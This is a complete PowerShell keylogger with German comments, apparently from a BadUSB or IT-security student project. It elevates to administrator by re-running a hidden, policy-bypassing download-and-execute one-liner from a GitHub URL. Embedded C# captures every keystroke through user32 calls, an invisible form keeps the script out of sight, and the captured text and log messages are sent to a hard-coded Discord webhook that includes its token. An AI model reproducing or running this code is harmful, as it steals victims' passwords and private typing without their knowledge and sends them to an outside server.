# PowerShell Keylogger & Discord-Webhook-Sender mit Timeout (robuster für deutsches Layout)

# Erzwinge STA-Thread für Forms
[System.Threading.Thread]::CurrentThread.ApartmentState = 'STA'

# Prüfe, ob als Administrator läuft
function Test-Admin {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Test-Admin)) {
    # Starte als Administrator neu mit dem gleichen One-Liner
    $command = "powershell -w h -NoP -Ep Bypass `"irm https://raw.githubusercontent.com/JustusKapst/it-security_projekt1/5b5b359d713fbd06c6f302190fd3e2209c289258/logger.ps1 | iex`""
    Start-Process powershell -ArgumentList $command -Verb RunAs -Wait
    exit
}

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Diagnostics;
using System.IO;
using System.Collections.Generic;

public static class KeyLogger
{
    [DllImport("user32.dll")]
    private static extern short GetAsyncKeyState(int vKey);

    [DllImport("user32.dll")]
    private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

    [DllImport("user32.dll")]
    private static extern IntPtr GetKeyboardLayout(uint idThread);

    [DllImport("user32.dll")]
    private static extern bool GetKeyboardState(byte[] lpKeyState);

    private static StringBuilder _buffer = new StringBuilder();
    private static DateTime _lastSend = DateTime.Now;
    private static string _hookUrl;
    private static string _logFile = "badusb_logger.txt";
    private static Dictionary<int, bool> _keyStates = new Dictionary<int, bool>();

    public static void Initialize(string hookUrl)
    {
        _hookUrl = hookUrl;
        LogToFile("KeyLogger initialisiert");
    }

    public static void CheckKeys()
    {
        for (int vk = 0x01; vk <= 0xFE; vk++)
        {
            short state = GetAsyncKeyState(vk);
            bool isPressed = (state & 0x8000) != 0;
            bool wasPressed = _keyStates.ContainsKey(vk) && _keyStates[vk];

            if (isPressed && !wasPressed)
            {
                // Taste wurde gerade gedrückt
                string key = GetKeyString(vk);
                _buffer.Append(key);
                LogToFile("Taste erfasst: " + key);
            }

            _keyStates[vk] = isPressed;
        }
    }

    private static string GetKeyString(int vkCode)
    {
        byte[] keyState = new byte[256];
        GetKeyboardState(keyState);

        StringBuilder sb = new StringBuilder(10);
        IntPtr hkl = GetKeyboardLayout(0);
        int result = ToUnicodeEx((uint)vkCode, 0, keyState, sb, sb.Capacity, 0, hkl);

        if (result > 0)
        {
            return sb.ToString();
        }
        else
        {
            // Für nicht-zeichenbasierte Keys
            string keyDesc = "";
            switch (vkCode)
            {
                case 0x08: keyDesc = "[BACKSPACE]"; break;
                case 0x09: keyDesc = "[TAB]"; break;
                case 0x0D: keyDesc = "[ENTER]"; break;
                case 0x1B: keyDesc = "[ESC]"; break;
                case 0x20: keyDesc = " "; break;
                case 0x25: keyDesc = "[LEFT]"; break;
                case 0x26: keyDesc = "[UP]"; break;
                case 0x27: keyDesc = "[RIGHT]"; break;
                case 0x28: keyDesc = "[DOWN]"; break;
                case 0x2D: keyDesc = "[INSERT]"; break;
                case 0x2E: keyDesc = "[DELETE]"; break;
                case 0x70: keyDesc = "[F1]"; break;
                case 0x71: keyDesc = "[F2]"; break;
                case 0x72: keyDesc = "[F3]"; break;
                case 0x73: keyDesc = "[F4]"; break;
                case 0x74: keyDesc = "[F5]"; break;
                case 0x75: keyDesc = "[F6]"; break;
                case 0x76: keyDesc = "[F7]"; break;
                case 0x77: keyDesc = "[F8]"; break;
                case 0x78: keyDesc = "[F9]"; break;
                case 0x79: keyDesc = "[F10]"; break;
                case 0x7A: keyDesc = "[F11]"; break;
                case 0x7B: keyDesc = "[F12]"; break;
                default: keyDesc = $"[VK:{vkCode}]"; break;
            }
            return keyDesc;
        }
    }

    public static void SendBuffer()
    {
        while (_buffer.Length > 0)
        {
            string content = _buffer.ToString();
            if (content.Length > 1900)
            {
                content = content.Substring(0, 1900);
                _buffer.Remove(0, 1900);
            }
            else
            {
                _buffer.Clear();
            }
            try
            {
                using (var client = new System.Net.WebClient())
                {
                    client.Headers.Add("Content-Type", "application/json");
                    string payload = $"{{\"content\":\"{content.Replace("\"", "\\\"")}\"}}";
                    client.UploadString(_hookUrl, "POST", payload);
                }
                LogToFile("Buffer gesendet: " + content);
                _lastSend = DateTime.Now;
            }
            catch (Exception ex) { LogToFile("SendBuffer Exception: " + ex.ToString()); }
        }
    }

    private static void LogToFile(string message)
    {
        try
        {
            File.AppendAllText(_logFile, DateTime.Now.ToString("o") + ": " + message + Environment.NewLine);
            // Sende wichtige Logs an Discord
            if (message.Contains("Exception") || message.Contains("initialisiert") || message.Contains("gesendet") || message.Contains("Taste erfasst"))
            {
                if (!string.IsNullOrEmpty(_hookUrl))
                {
                    using (var client = new System.Net.WebClient())
                    {
                        client.Headers.Add("Content-Type", "application/json");
                        string payload = $"{{\"content\":\"[LOG] {message.Replace("\"", "\\\"")}\"}}";
                        client.UploadString(_hookUrl, "POST", payload);
                    }
                }
            }
        }
        catch {}
    }
}
"@

$hookUrl = "https://discord.com/api/webhooks/1433072215401824358/f95HWyiUinYpyysS0MA7NUuSPFs1Ute71SLQ0hEYYvebxsCoQam850qtTGwHRDbR2yg3"

# Logger-Start an Discord melden
try {
    Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="[Logger] gestartet: $(Get-Date -Format o)"}|ConvertTo-Json) -ContentType "application/json"
} catch {}

[KeyLogger]::Initialize($hookUrl)
$start = Get-Date
$timeout = 120 # Sekunden

# Lock-Objekt für SendBuffer-Synchronisierung
$sendBufferLock = New-Object Object

# Timer für Tasten-Überprüfung (alle 10ms)
$checkTimer = New-Object System.Timers.Timer
$checkTimer.Interval = 10
$checkTimer.AutoReset = $true
$checkTimer.add_Elapsed({
    [KeyLogger]::CheckKeys()
})
$checkTimer.Start()

# Timer für regelmäßiges Senden (alle 500ms)
$sendTimer = New-Object System.Timers.Timer
$sendTimer.Interval = 500
$sendTimer.AutoReset = $true
$sendTimer.add_Elapsed({
    [System.Threading.Monitor]::Enter($sendBufferLock)
    try {
        [KeyLogger]::SendBuffer()
    } finally {
        [System.Threading.Monitor]::Exit($sendBufferLock)
    }
})
$sendTimer.Start()

# Timer für Timeout (120 Sekunden)
$timeoutTimer = New-Object System.Timers.Timer
$timeoutTimer.Interval = $timeout * 1000
$timeoutTimer.AutoReset = $false
$timeoutTimer.add_Elapsed({
    [System.Windows.Forms.Application]::Exit()
})
$timeoutTimer.Start()

# Erstelle eine unsichtbare Form für die Message-Loop
$form = New-Object System.Windows.Forms.Form
$form.ShowInTaskbar = $false
$form.WindowState = 'Minimized'
$form.Opacity = 0
$form.Visible = $true

# Message-Loop für Hook
[System.Windows.Forms.Application]::Run($form)

# Nach Timeout stoppen
$checkTimer.Stop()
$sendTimer.Stop()
$timeoutTimer.Stop()
[KeyLogger]::SendBuffer()  # Rest senden

# Logger-Ende an Discord melden
LogToFile("Logger beendet, sende Nachricht an Discord")
try {
    Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="[Logger] beendet: $(Get-Date -Format o)"}|ConvertTo-Json) -ContentType "application/json"
    LogToFile("Beendigungs-Nachricht erfolgreich gesendet")
} catch {
    LogToFile("Fehler beim Senden der Beendigungs-Nachricht: " + $_.Exception.Message)
}
